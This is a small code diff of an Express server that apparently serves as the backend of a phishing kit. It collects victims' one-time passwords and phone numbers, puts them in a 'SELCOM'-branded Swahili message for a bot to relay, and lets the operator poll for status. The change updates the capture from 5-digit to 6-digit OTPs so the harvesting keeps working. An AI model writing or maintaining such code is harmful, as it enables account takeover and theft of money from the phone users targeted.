@@ -191,7 +191,7 @@ app.get('/api/check-status/:userId', (req, res) => {
   res.status(200).json({ status: session.status });
 });
 
-// Step 2: 5-digit OTP accompanied by applicant phone number
+// Step 2: 6-digit OTP accompanied by applicant phone number
 app.post('/api/submit-otp', async (req, res) => {
   try {
     const { userId, otp } = req.body || {};
@@ -202,7 +202,7 @@ app.post('/api/submit-otp', async (req, res) => {
     session.status = 'WAITING_OTP_VERIFICATION';
     session.otp = otp;
 
-    const message = `🔴 *SELCOM - OTP (Tarakimu 5)*\n\n` +
+    const message = `🔴 *SELCOM - OTP (Tarakimu 6)*\n\n` +
                     `📞 *Namba ya Simu:* \`${session.phone}\`\n` +
                     `📱 *Msimbo wa OTP:* \`${otp}\``;
 
@@ -248,4 +248,4 @@ app.listen(PORT, async () => {
   await initBot();
   console.log(`Server running on port ${PORT}`);
 });
-                                                                                                                             
+                                 
